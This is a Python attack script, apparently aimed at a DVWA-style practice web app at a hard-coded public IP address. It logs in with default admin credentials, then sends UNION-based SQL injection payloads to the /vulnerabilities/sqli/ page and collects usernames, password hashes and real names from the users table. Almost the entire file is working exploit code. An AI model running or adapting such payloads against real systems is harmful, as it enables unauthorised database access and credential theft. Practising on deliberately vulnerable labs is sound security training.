
import requests
import re
from urllib.parse import quote

session = requests.Session()
url = "http://31.97.117.123"

print("\n" + "="*100)
print("PHASE 2: SQL INJECTION EXPLOITATION & DATA EXTRACTION")
print("="*100)

# Authenticate
login_page = session.get(f"{url}/login.php")
match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
user_token = match.group(1) if match else ""

data = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{url}/login.php", data=data, allow_redirects=True)
print("\n[+] Authenticated successfully")

# Access the SQL injection vulnerability
print("\n[*] Accessing SQL injection vulnerability at /vulnerabilities/sqli/")

# Let's try to extract the complete users table with all columns
# First, let's understand the structure by trying different queries

payloads = [
    # Payload 1: Extract user and password
    ("1' UNION SELECT user, password FROM users -- ", "user, password"),
    # Payload 2: Extract all users with first_name and last_name
    ("1' UNION SELECT CONCAT(user, ':', password), CONCAT(first_name, ' ', last_name) FROM users -- ", "user:hash, name"),
    # Payload 3: Extract first_name and last_name 
    ("1' UNION SELECT first_name, last_name FROM users WHERE user_id > 0 -- ", "first_name, last_name"),
]

all_users_data = []

for payload, description in payloads:
    print(f"\n[*] Testing payload: {description}")
    print(f"    SQL: {payload}")
    
    try:
        sqli_response = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")
        
        # Extract all matches from the response
        matches = re.findall(r'First name: ([^<]+)<br />\s*Surname: ([^<]+)</pre>', sqli_response.text)
        
        if matches:
            print(f"    [+] Found {len(matches)} results:")
            for first, last in matches:
                print(f"        - {first.strip()} | {last.strip()}")
                all_users_data.append((first.strip(), last.strip()))
        else:
            # Try alternative extraction
            matches = re.findall(r'<pre>ID:.*?First name: ([^<]+)<br />\s*Surname: ([^<]+)</pre>', sqli_response.text, re.DOTALL)
            if matches:
                print(f"    [+] Found {len(matches)} results:")
                for first, last in matches:
                    print(f"        - {first.strip()} | {last.strip()}")
                    all_users_data.append((first.strip(), last.strip()))
    except Exception as e:
        print(f"    [-] Error: {str(e)}")

print(f"\n[+] Total unique records collected: {len(set(all_users_data))}")


